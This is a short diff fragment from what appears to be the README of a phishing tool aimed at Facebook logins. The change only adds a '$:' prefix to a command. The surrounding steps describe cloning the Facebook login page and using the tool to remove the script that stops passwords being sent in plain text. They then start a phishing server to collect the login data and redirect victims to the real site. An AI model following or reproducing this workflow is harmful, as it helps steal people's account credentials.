@@ -10,7 +10,7 @@
   ```
 - remove the script that does not allow the password to be sent in plain text to the server
   ```sh
-  lft-analyzer remove clone.html -s 'script[src~="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/MTfFXMprGyn.js?_nc_x=Ij3Wp8lg5Kz"]' -u 
+  $: lft-analyzer remove clone.html -s 'script[src~="https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/MTfFXMprGyn.js?_nc_x=Ij3Wp8lg5Kz"]' -u 
   ```
   
 - start the phishing server to receive the login data, and redirect to the official facebook<br>
